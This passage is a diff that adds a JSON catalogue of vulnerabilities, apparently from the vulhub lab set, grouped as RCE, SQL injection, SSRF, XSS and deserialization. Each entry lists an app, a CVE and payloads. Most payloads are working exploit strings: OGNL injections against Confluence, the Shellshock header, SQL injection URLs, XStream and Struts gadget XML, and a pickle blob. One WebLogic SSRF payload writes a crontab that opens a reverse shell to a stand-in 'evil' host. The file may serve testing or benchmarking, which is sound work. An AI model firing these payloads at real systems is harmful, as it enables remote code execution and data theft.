+      "description": "CraftCMS versions before 5.5.2 and 4.13.2 are vulnerable to remote code execution when PHP's register_argc_argv is enabled, allowing attackers to control template paths via --templatesPath and exploit template injection to execute arbitrary code.",
+      "payloads": [
+        "http://<your-ip>:8088/?--templatesPath=ftp://<evil-ip>:21212/",
+        "{{ ['system', 'id'] | sort('call_user_func') | join('') }}"
+      ]
+    },
+    {
+      "app": "craftcms",
+      "target": "CVE-2025-32432",
+      "description": "Unauthenticated remote code execution via insufficient input validation in the /actions/assets/generate-transform endpoint, allowing attackers to inject malicious __class parameters to abuse Yii's dependency injection container and execute arbitrary PHP code.",
+      "payloads": [
+        "GET request to inject PHP code into session file",
+        "POST request to /actions/assets/generate-transform with __class parameter",
+        "yii\\rbac\\PhpManager class for dependency injection abuse"
+      ]
+    },
+    {
+      "app": "couchdb",
+      "target": "CVE-2017-12636",
+      "description": "An arbitrary command execution vulnerability in Apache CouchDB allows attackers to modify the query_server configuration via the config API, leading to command execution when a view is executed with a crafted language setting.",
+      "payloads": [
+        "PUT /_config/query_servers/cmd with body \"id >/tmp/success\"",
+        "POST /vultest/_temp_view?limit=10 with body {\"language\":\"cmd\",\"map\":\"\"} and Content-Type: application/json",
+        "PUT /_node/nonode@nohost/_config/query_servers/cmd with body \"id >/tmp/success\""
+      ]
+    },
+    {
+      "app": "couchdb",
+      "target": "CVE-2022-24706",
+      "description": "Apache CouchDB uses a default Erlang distribution cookie 'monster' in versions up to 3.2.1, allowing attackers to authenticate and execute arbitrary commands via the Erlang/OTP Distribution protocol on port 9100.",
+      "payloads": [
+        "default cookie 'monster'",
+        "port 4369 for epmd service",
+        "port 9100 for cluster communication"
+      ]
+    },
+    {
+      "app": "confluence",
+      "target": "CVE-2019-3396",
+      "description": "Atlassian Confluence versions before 6.14.2 have an unauthorized directory traversal vulnerability that allows reading arbitrary files and exploiting Velocity template injection to execute arbitrary commands.",
+      "payloads": [
+        "POST /rest/tinymce/1/macro/preview HTTP/1.1",
+        "{\"contentId\":\"786458\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"https://www.viddler.com/v/23464dc6\",\"width\":\"1000\",\"height\":\"1000\",\"_template\":\"../web.xml\"}}}",
+        "file:///etc/passwd",
+        "https://..."
+      ]
+    },
+    {
+      "app": "confluence",
+      "target": "CVE-2021-26084",
+      "description": "OGNL expression injection vulnerability in Atlassian Confluence Webwork, allowing unauthenticated attackers to execute arbitrary code via crafted payloads in specific endpoints.",
+      "payloads": [
+        "queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027",
+        "queryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022id%5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+inputStreamReader+%3d+new+java.io.InputSt"
+      ]
+    },
+    {
+      "app": "confluence",
+      "target": "CVE-2022-26134",
+      "description": "Atlassian Confluence is vulnerable to OGNL expression injection, allowing unauthenticated attackers to execute arbitrary commands via crafted HTTP requests.",
+      "payloads": [
+        "GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1",
+        "${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"id\").getInputStream(),\"utf-8\")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(\"X-Cmd-Response\",#a))}"
+      ]
+    },
+    {
+      "app": "confluence",
+      "target": "CVE-2023-22527",
+      "description": "An OGNL expression injection vulnerability in Atlassian Confluence versions 8.0 to 8.5.3 allows unauthenticated attackers to execute arbitrary commands via a crafted POST request to a velocity template endpoint.",
+      "payloads": [
+        "POST /template/aui/text-inline.vm HTTP/1.1",
+        "label=\\u0027%2b#request\\u005b\\u0027.KEY_velocity.struts2.context\\u0027\\u005d.internalGet(\\u0027ognl\\u0027).findValue(#parameters.x,{})%2b\\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({\"id\"}))"
+      ]
+    },
+    {
+      "app": "comfyui",
+      "target": "CVE-2025-67303",
+      "description": "The vulnerability allows attackers to inject configuration parameters via the /api/manager/db_mode endpoint to disable security restrictions, then use /api/manager/reboot and /customnode/install/git_url to install and execute malicious custom nodes, leading to remote code execution.",
+      "payloads": [
+        "GET /api/manager/db_mode?value=cache%0Dsecurity_level%20=%20weak HTTP/1.1",
+        "POST /customnode/install/git_url HTTP/1.1\nContent-Type: text/plain\n\nhttp://your-ip:9999/evil-node-abc123"
+      ]
+    },
+    {
+      "app": "cmsms",
+      "target": "CVE-2021-26120",
+      "description": "CMS Made Simple (CMSMS) versions <= 2.2.15 are vulnerable to server-side template injection (SSTI) via Smarty, allowing authenticated users with designer permissions to inject PHP code in the {function name= substring, leading to remote code execution.",
+      "payloads": [
+        "{function name= substring with injected PHP code",
+        "python poc.py 127.0.0.1 / id"
+      ]
+    },
+    {
+      "app": "cacti",
+      "target": "CVE-2022-46169",
+      "description": "A command injection vulnerability in Cacti's remote_agent.php allows attackers to bypass server-side validation via the X-Forwarded-For header and execute arbitrary commands.",
+      "payloads": [
+        "GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`touch+/tmp/success`",
+        "X-Forwarded-For: 127.0.0.1"
+      ]
+    },
+    {
+      "app": "cacti",
+      "target": "CVE-2025-24367",
+      "description": "The vulnerability is a command injection in Cacti's RRDTool parameters due to insufficient filtering of newline characters, allowing authenticated users to inject arbitrary commands and create PHP files for remote code execution.",
+      "payloads": [
+        "XXX\ncreate my.rrd --step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200\ngraph vulhub.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=phpinfo();?>",
+        "%0a"
+      ]
+    },
+    {
+      "app": "bash",
+      "target": "CVE-2014-6271",
+      "description": "Bash Shellshock vulnerability allows remote command injection via specially crafted environment variables, such as User-Agent headers, in CGI scripts.",
+      "payloads": [
+        "User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id"
+      ]
+    },
+    {
+      "app": "aria2",
+      "target": "rce",
+      "description": "Aria2's RPC interface allows arbitrary file writes by downloading files to any directory, which can be exploited to write malicious files like cron jobs for remote code execution.",
+      "payloads": [
+        "http://your-ip:6800/jsonrpc",
+        "Dir: /etc/cron.d/",
+        "File Name: shell",
+        "URL for malicious file download"
+      ]
+    },
+    {
+      "app": "apisix",
+      "target": "CVE-2020-13945",
+      "description": "Apache APISIX uses a default admin token, allowing attackers to access admin APIs and inject arbitrary Lua scripts via the 'script' parameter, leading to remote code execution.",
+      "payloads": [
+        "X-API-KEY: edd1c9f034335f136f87ad84b625c8f1",
+        "POST /apisix/admin/routes HTTP/1.1 with JSON body containing 'script' parameter with malicious Lua code",
+        "http://your-ip:9080/attack?cmd=id"
+      ]
+    },
+    {
+      "app": "apache-druid",
+      "target": "CVE-2021-25646",
+      "description": "Apache Druid 0.20.0 and earlier allows execution of arbitrary JavaScript code via malicious requests, bypassing server configurations, leading to remote code execution.",
+      "payloads": [
+        "POST /druid/indexer/v1/sampler HTTP/1.1",
+        "Content-Type: application/json",
+        "{\"type\":\"index\",\"spec\":{\"ioConfig\":{\"type\":\"index\",\"firehose\":{\"type\":\"local\",\"baseDir\":\"/etc\",\"filter\":\"passwd\"}},\"dataSchema\":{\"dataSource\":\"test\",\"parser\":{\"parseSpec\":{\"format\":\"javascript\",\"timestampSpec\":{},\"dimensionsSpec\":{},\"function\":\"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\\\"sh\\\",\\\"-c\\\",\\\"id\\\"]).getInputStream()).useDelimiter(\\\"\\\\A\\\").next();return {timestamp:123123,test: a}}\",\"\":{\"enabled\":\"true\"}}}}},\"samplerConfig\":{\"numRows\":10}}"
+      ]
+    },
+    {
+      "app": "airflow",
+      "target": "CVE-2020-11978",
+      "description": "Unauthorized command injection in example DAGs of Apache Airflow 1.10.10 and earlier, allowing arbitrary command execution on Worker nodes via crafted JSON input.",
+      "payloads": [
+        "{\"message\":\"'\\\";touch /tmp/airflow_dag_success;#\"}"
+      ]
+    },
+    {
+      "app": "airflow",
+      "target": "CVE-2020-11981",
+      "description": "Apache Airflow 1.10.10 and earlier allows remote command execution via controlled Celery message broker (e.g., Redis) by sending crafted tasks to execute arbitrary commands in Worker processes.",
+      "payloads": [
+        "airflow.executors.celery_executor.execute_command",
+        "touch /tmp/airflow_celery_success"
+      ]
+    },
+    {
+      "app": "activemq",
+      "target": "CVE-2022-41678",
+      "description": "Apache ActiveMQ Jolokia backend allows arbitrary file write via MBeans, leading to remote code execution by writing webshells.",
+      "payloads": [
+        "/api/jolokia/list",
+        "org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean",
+        "setConfigText",
+        "jdk.management.jfr.FlightRecorderMXBean",
+        "/admin/shell.jsp",
+        "/admin/shelljfr.jsp"
+      ]
+    },
+    {
+      "app": "vulhub",
+      "target": "struts2",
+      "description": "The vulnerability allows remote command execution through Struts2 framework flaws, enabling attackers to execute arbitrary commands on the server.",
+      "payloads": []
+    },
+    {
+      "app": "gitlist",
+      "target": "0.6.0-rce",
+      "description": "The vulnerability in gitlist 0.6.0 allows remote code execution through improper handling of user input in the application.",
+      "payloads": []
+    }
+  ],
+  "sqli": [
+    {
+      "app": "zabbix",
+      "target": "CVE-2016-10134",
+      "description": "Zabbix versions before 2.2.14 and 3.0.4 have an SQL injection vulnerability in latest.php via the toggle_ids array parameter, allowing remote attackers to execute arbitrary SQL commands without authentication, also exploitable via jsrpc.php.",
+      "payloads": [
+        "toggle_ids[]=updatexml(0,concat(0xa,user()),0)",
+        "profileIdx2=updatexml(0,concat(0xa,user()),0)"
+      ]
+    },
+    {
+      "app": "thinkphp",
+      "target": "in-sqlinjection",
+      "description": "The vulnerability is a SQL injection in ThinkPHP5 that allows executing arbitrary SQL commands via manipulated array parameters in the URL, leading to data extraction and sensitive information disclosure.",
+      "payloads": [
+        "ids[0,updatexml(0,concat(0xa,user()),0)]=1",
+        "ids[]=1&ids[]=2"
+      ]
+    },
+    {
+      "app": "skywalking",
+      "target": "8.3.0-sqli",
+      "description": "Apache Skywalking 8.3.0 has a SQL injection vulnerability in the GraphQL interface, where the metricName parameter is improperly concatenated into SQL queries.",
+      "payloads": [
+        "POST /graphql HTTP/1.1",
+        "{\"query\":\"query queryLogs($condition: LogQueryCondition) {\\n  queryLogs(condition: $condition) {\\n    total\\n    logs {\\n      serviceId\\n      serviceName\\n      isError\\n      content\\n    }\\n  }\\n}\\n\",\"variables\":{\"condition\":{\"metricName\":\"sqli\",\"state\":\"ALL\",\"paging\":{\"pageSize\":10}}}}"
+      ]
+    },
+    {
+      "app": "showdoc",
+      "target": "3.2.5-sqli",
+      "description": "ShowDoc <= 3.2.5 has an unauthorized SQL injection vulnerability that allows attackers to steal user passwords and tokens stored in the SQLite database.",
+      "payloads": [
+        "http://localhost:8080"
+      ]
+    },
+    {
+      "app": "rocketchat",
+      "target": "CVE-2021-22911",
+      "description": "A NoSQL injection vulnerability in Rocket Chat versions 3.12.1 to 3.13.2 allows attackers to extract sensitive information, such as password reset tokens, using MongoDB operators like $regex.",
+      "payloads": [
+        "$regex: ^7",
+        "$regex: ^8"
+      ]
+    },
+    {
+      "app": "metersphere",
+      "target": "CVE-2021-45788",
+      "description": "MeterSphere v1.15.4 has a SQL injection vulnerability in testcase-related APIs via the 'orders' parameter in a POST request, allowing authenticated users to execute arbitrary SQL commands.",
+      "payloads": [
+        "{\"orders\":[{\"name\":\"name\",\"type\":\",if(1=1,sleep(2),0)\"}]}"
+      ]
+    },
+    {
+      "app": "magento",
+      "target": "2.2-sqli",
+      "description": "A SQL injection vulnerability in Magento 2.2 due to a bug in the prepareSqlCondition function that introduces unintended single quotes, allowing for boolean-based blind SQL injection.",
+      "payloads": [
+        "http://your-ip:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d0)+--+-",
+        "http://your-ip:8080/catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=%3f&ids[0][product_id][to]=)))+OR+(SELECT+1+UNION+SELECT+2+FROM+DUAL+WHERE+1%3d1)+--+-"
+      ]
+    },
+    {
+      "app": "joomla",
+      "target": "CVE-2017-8917",
+      "description": "Joomla 3.7.0's com_fields component has an SQL injection vulnerability due to insufficient filtering of request data, allowing unauthorized access and exploitation.",
+      "payloads": [
+        "index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,user()),1)"
+      ]
+    },
+    {
+      "app": "geoserver",
+      "target": "CVE-2023-25157",
+      "description": "GeoServer versions 2.22.1 and 2.21.4 and earlier have SQL injection vulnerabilities in multiple OGC expressions, allowing attackers to execute arbitrary SQL commands via crafted CQL_FILTER parameters.",
+      "payloads": [
+        "http://your-ip:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&CQL_FILTER=strStartsWith%28name%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true"
+      ]
+    },
+    {
+      "app": "ecshop",
+      "target": "collection_list-sqli",
+      "description": "ECShop 4.x collection_list function has SQL injection via insert_ functions, allowing arbitrary SQL query execution.",
+      "payloads": [
+        "X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953auser_account|a:2:{s:7:\"user_id\";s:38:\"0'-(updatexml(1,repeat(user(),2),1))-'\";s:7:\"payment\";s:1:\"4\";}|45ea207d7a2b68c49582d2d22adf953a",
+        "X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:44:\"1' and updatexml(1,repeat(user(),2),1) and '\";|"
+      ]
+    },
+    {
+      "app": "ecshop",
+      "target": "xianzhi-2017-02-82239600",
+      "description": "ECShop 2.x/3.x has a SQL injection vulnerability in the Referer header that allows malicious data injection, leading to arbitrary code execution.",
+      "payloads": [
+        "45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:\"num\";s:107:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}45ea207d7a2b68c49582d2d22adf953a",
+        "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:107:\"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -\";s:2:\"id\";s:11:\"-1' UNION/*\";}554fcae493e564ee0dc75bdf2ebf94ca"
+      ]
+    },
+    {
+      "app": "drupal",
+      "target": "CVE-2014-3704",
+      "description": "SQL injection vulnerability in Drupal Core 7.x before 7.32 due to improper construction of prepared statements in the expandArguments function, allowing remote attackers to execute malicious SQL via crafted array keys.",
+      "payloads": [
+        "name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob",
+        "name[0]=a"
+      ]
+    },
+    {
+      "app": "django",
+      "target": "CVE-2019-14234",
+      "description": "SQL injection vulnerability in Django's JSONField and HStoreField where user-controlled key names in queries can lead to SQL execution, particularly exploitable via the admin interface.",
+      "payloads": [
+        "detail__a'b=123"
+      ]
+    },
+    {
+      "app": "django",
+      "target": "CVE-2020-9402",
+      "description": "SQL injection vulnerability in Django's GIS functions and aggregates due to tolerance parameter, allowing user-controlled field names in queries to execute arbitrary SQL on Oracle databases.",
+      "payloads": [
+        "http://your-ip:8000/vuln/?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v$instance)) from dual) is null  OR (1+1",
+        "http://your-ip:8000/vuln2/?q=0.05))) FROM \"VULN_COLLECTION2\"  where  (select utl_inaddr.get_host_name((SELECT user FROM DUAL)) from dual) is not null  --"
+      ]
+    },
+    {
+      "app": "django",
+      "target": "CVE-2021-35042",
+      "description": "SQL injection vulnerability in Django's QuerySet.order_by() function where user-controlled input is passed without proper sanitization, allowing attackers to execute arbitrary SQL commands.",
+      "payloads": [
+        "order=-id",
+        "order=vuln_collection.name);select updatexml(1, concat(0x7e,(select @@version)),1)%23"
+      ]
+    },
+    {
+      "app": "django",
+      "target": "CVE-2022-34265",
+      "description": "SQL injection vulnerability in Django's Trunc() and Extract() database functions due to improper handling of user input in the date parameter.",
+      "payloads": [
+        "xxxx'xxxx"
+      ]
+    },
+    {
+      "app": "cmsms",
+      "target": "CVE-2019-9053",
+      "description": "CMS Made Simple versions before 2.2.10 have an unauthenticated SQL injection vulnerability in the frontend, allowing attackers to retrieve admin passwords or password reset tokens.",
+      "payloads": [
+        "http://127.0.0.1",
+        "python2 poc.py -u http://127.0.0.1"
+      ]
+    },
+    {
+      "app": "cacti",
+      "target": "CVE-2023-39361",
+      "description": "SQL injection in graph_view.php via the rfilter parameter when guest user is enabled, leading to remote code execution through stacked queries and local file inclusion.",
+      "payloads": [
+        "http://your-ip:8080/graph_view.php?action=tree_content&node=1-1-tree_anchor&rfilter=aaaaaaa\"%20OR%20\"\"=\"((\"))%20UNION%20SELECT%201,2,(select%20concat(id,0x23,username,0x23,password)%20from%20user_auth%20limit%201),4,5,6,(select%20user()),(select%20version()),9,10%23",
+        "http://your-ip:8080/graph_view.php?action=tree_content&node=1-1-tree_anchor&rfilter=aaaaa\"%20OR%20\"\"=\"((\"));INSERT%20INTO%20plugin_hooks(name,hook,file,status)%20VALUES%20(\".\",\"login_before\",\"../log/cacti.log\",1);%23",
+        "http://your-ip:8080/graph_view.php?action=tree_content&node=1-1-tree_anchor&rfilter=aaaaa\"%20OR%20\"\"=\"((\"))%20UNION%20SELECT%201,2,3,4,5,6,updatexml(rand(),concat(0x7e,\"<?php%20phpinfo();?>\",0x7e),null),8,9,10%23"
+      ]
+    },
+    {
+      "app": "1panel",
+      "target": "CVE-2024-39907",
+      "description": "SQL injection vulnerability in the orderBy parameter of the /api/v1/hosts/command/search endpoint due to insufficient input validation, allowing attackers to execute arbitrary SQL commands and potentially achieve remote code execution via file writes.",
+      "payloads": [
+        "3;ATTACH DATABASE '/tmp/randstr.txt' AS test;create TABLE test.exp (data text);create TABLE test.exp (data text);drop table test.exp;"
+      ]
+    }
+  ],
+  "ssrf": [
+    {
+      "app": "weblogic",
+      "target": "ssrf",
+      "description": "A server-side request forgery (SSRF) vulnerability in the UDDI Explorer application of Oracle WebLogic Server allows attackers to send arbitrary HTTP requests, potentially enabling internal network reconnaissance or attacks on vulnerable services like Redis.",
+      "payloads": [
+        "GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001",
+        "operator parameter with URLs like http://172.18.0.2:6379",
+        "URL-encoded Redis commands: set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil%2F21%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave"
+      ]
+    },
+    {
+      "app": "httpd",
+      "target": "CVE-2021-40438",
+      "description": "Apache HTTP Server 2.4.48 and earlier versions have a logic error in the mod_proxy module that allows attackers to control the reverse proxy server address, leading to an SSRF vulnerability.",
+      "payloads": [
+        "/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+      ]
+    },
+    {
+      "app": "grafana",
+      "target": "admin-ssrf",
+      "description": "Grafana admin panel allows sending HTTP requests to arbitrary addresses with custom headers, enabling server-side request forgery attacks.",
+      "payloads": [
+        "http://example.interact.sh/attack"
+      ]
+    },
+    {
+      "app": "geoserver",
+      "target": "CVE-2021-40822",
+      "description": "Unauthenticated SSRF vulnerability in GeoServer's TestWfsPost interface allows attackers to make the server send requests to arbitrary URLs via the 'url' parameter.",
+      "payloads": [
+        "POST /geoserver/TestWfsPost HTTP/1.1 with form data: url=http://internal/geoserver/../&body=testtest&username=admin&password=admin",
+        "url parameter with arbitrary target URL (e.g., http://google.com)",
+        "Host header matching the hostname in the url parameter (e.g., Host: internal)"
+      ]
+    },
+    {
+      "app": "apache-cxf",
+      "target": "CVE-2024-28752",
+      "description": "Apache CXF with Aegis DataBinding allows SSRF attacks via SOAP requests with XOP includes, enabling attackers to make the server send requests to arbitrary URLs and access internal resources.",
+      "payloads": [
+        "POST /test HTTP/1.1 with Content-Type: multipart/related and boundary, SOAP envelope containing <xop:Include href=\"file:///etc/hosts\">"
+      ]
+    },
+    {
+      "app": "adminer",
+      "target": "CVE-2021-21311",
+      "description": "Adminer versions 4.0.0 to 4.7.9 have a server-side request forgery vulnerability when connecting to ElasticSearch or ClickHouse databases, allowing attackers to make arbitrary HTTP requests from the server.",
+      "payloads": [
+        "example.com"
+      ]
+    }
+  ],
+  "xss": [
+    {
+      "app": "pdfjs",
+      "target": "CVE-2024-4367",
+      "description": "PDF.js versions up to 4.1.392 allow arbitrary JavaScript code execution via a malicious PDF file upload, leading to cross-site scripting (XSS) attacks.",
+      "payloads": [
+        "poc.pdf"
+      ]
+    },
+    {
+      "app": "drupal",
+      "target": "CVE-2019-6341",
+      "description": "Drupal's file upload module improperly handles files without extensions, allowing attackers to upload a file that appears as an image but contains embedded JavaScript HTML code, leading to cross-site scripting when accessed by other users.",
+      "payloads": [
+        "malicious GIF file created by PoC script from thezdi/PoC repository",
+        "file uploaded to /sites/default/files/pictures/<YYYY-MM>/ directory"
+      ]
+    },
+    {
+      "app": "django",
+      "target": "CVE-2017-12794",
+      "description": "Django debug error page in versions before 1.11.5 and 1.10.8 contains a cross-site scripting (XSS) vulnerability when DEBUG mode is enabled, allowing execution of arbitrary JavaScript via unescaped HTML in database error messages.",
+      "payloads": [
+        "http://your-ip:8000/create_user/?username=<script>alert(1)</script>"
+      ]
+    }
+  ],
+  "deserialization": [
+    {
+      "app": "xstream",
+      "target": "CVE-2021-21351",
+      "description": "XStream 1.4.15 and earlier have a flawed blacklist that allows attackers to exploit javax.naming.ldap.Rdn$RdnEntry and javax.sql.rowset.BaseRowSet for JNDI injection, leading to remote code execution.",
+      "payloads": [
+        "<sorted-set> with nested javax.naming.ldap.Rdn_-RdnEntry and com.sun.org.apache.xpath.internal.objects.XRTreeFrag elements",
+        "LDAP URL payload for JNDI injection",
+        "POST / HTTP/1.1 with Content-Type: application/xml"
+      ]
+    },
+    {
+      "app": "xstream",
+      "target": "CVE-2021-29505",
+      "description": "XStream 1.4.16 and earlier have an incomplete blacklist for XML deserialization, allowing attackers to exploit sun.rmi.registry.RegistryImpl_Stub to trigger RMI requests and execute arbitrary commands.",
+      "payloads": [
+        "<java.util.PriorityQueue serialization='custom'>...</javax.naming.ldap.Rdn_-RdnEntry>",
+        "sun.rmi.registry.RegistryImpl_Stub",
+        "CommonsCollections6"
+      ]
+    },
+    {
+      "app": "weblogic",
+      "target": "CVE-2017-10271",
+      "description": "Oracle Weblogic's WLS Security component uses XMLDecoder to parse user-supplied XML data, leading to a deserialization vulnerability that allows arbitrary command execution.",
+      "payloads": [
+        "POST /wls-wsat/CoordinatorPortType HTTP/1.1 with Content-Type: text/xml and XML payload containing java.beans.XMLDecoder and ProcessBuilder elements for command execution or webshell upload"
+      ]
+    },
+    {
+      "app": "weblogic",
+      "target": "CVE-2018-2628",
+      "description": "A deserialization vulnerability in Weblogic WLS Core Components via the T3 protocol allows unauthenticated remote attackers to execute arbitrary commands.",
+      "payloads": [
+        "T3 protocol",
+        "JRMPListener",
+        "JRMPClient",
+        "JRMPClient2",
+        "CommonsCollections1"
+      ]
+    },
+    {
+      "app": "tomcat",
+      "target": "CVE-2025-24813",
+      "description": "In Apache Tomcat versions 9.x to 9.0.97, 10.x to 10.1.34, and 11.x to 11.0.2, when configured with a writable DefaultServlet (readonly=false) and file-based session persistence, attackers can write arbitrary files via partial PUT requests and trigger deserialization by manipulating the JSESSIONID cookie, leading to remote code execution.",
+      "payloads": [
+        "PUT /deserialize/session HTTP/1.1 with Content-Range header",
+        "Cookie: JSESSIONID=.deserialize"
+      ]
+    },
+    {
+      "app": "superset",
+      "target": "CVE-2023-37941",
+      "description": "Apache Superset versions 1.5 to 2.1.0 are vulnerable to remote code execution via Python Pickle deserialization in the metadata database, allowing authenticated users with write access to insert malicious payloads that execute arbitrary code when deserialized.",
+      "payloads": [
+        "Y3Bvc2l4CnN5c3RlbQpwMAooVnRvdWNoIC90bXAvc3VjY2VzcwpwMQp0cDIKUnAzCi4=",
+        "update key_value set value=X'63706f7369780a73797374656d0a70300a2856746f756368202f746d702f737563636573730a70310a7470320a5270330a2e' where resource='dashboard_permalink';"
+      ]
+    },
+    {
+      "app": "struts2",
+      "target": "s2-052",
+      "description": "The Struts2 Rest Plugin uses XStream to deserialize XML input without proper validation, allowing attackers to instantiate arbitrary classes and execute remote code via crafted XML payloads.",
+      "payloads": [
+        "<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"><dataHandler><dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"><is class=\"javax.crypto.CipherInputStream\"><cipher class=\"javax.crypto.NullCipher\"><initialized>false</initialized><opmode>0</opmode><serviceIterator class=\"javax.imageio.spi.FilterIterator\"><iter class=\"javax.imageio.spi.FilterIterator\"><iter class=\"java.util.Collections$EmptyIterator\"/><next class=\"java.lang.ProcessBuilder\">...</next></iter></serviceIterator></cipher></is></dataSource></dataHandler></value></jdk.nashorn.internal.objects.NativeString></entry></map>",
+        "POST /orders/3/edit HTTP/1.1",
+        "Content-Type: application/xml"
+      ]
+    },
+    {
+      "app": "shiro",
+      "target": "CVE-2016-4437",
+      "description": "Apache Shiro 1.2.4 and earlier versions have a default encryption key that allows attackers to forge remember-me cookies, triggering Java deserialization and enabling remote code execution.",
+      "payloads": [
+        "rememberMe=<encrypted_payload>",
+        "Cookie: rememberMe=<encrypted_payload>",
+        "CommonsBeanutils1 gadget from ysoserial",
